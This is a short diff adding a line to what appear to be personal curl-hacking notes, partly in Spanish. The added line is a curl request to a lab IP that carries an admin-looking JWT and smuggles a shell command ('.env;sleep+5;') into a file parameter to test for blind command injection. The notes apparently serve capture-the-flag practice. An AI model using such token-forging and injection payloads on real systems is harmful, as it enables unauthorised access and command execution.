@@ -77,3 +77,7 @@ Reference
     https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc
 
 curl que carga archivo (bee)
+
+
+
+    time curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU5ODE3M2ZjMDkzOTA0NjJmOTFiYWEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNlY25pZ21hQHRlc3QuY29tIiwiaWF0IjoxNjQyNjkzMTkyfQ.dxEs0eV1nPf4CctskzZ1DlWeOgi7tWaYHBD29A7gfx8' 'http://10.10.11.120/api/logs?file=.env;sleep+5;'
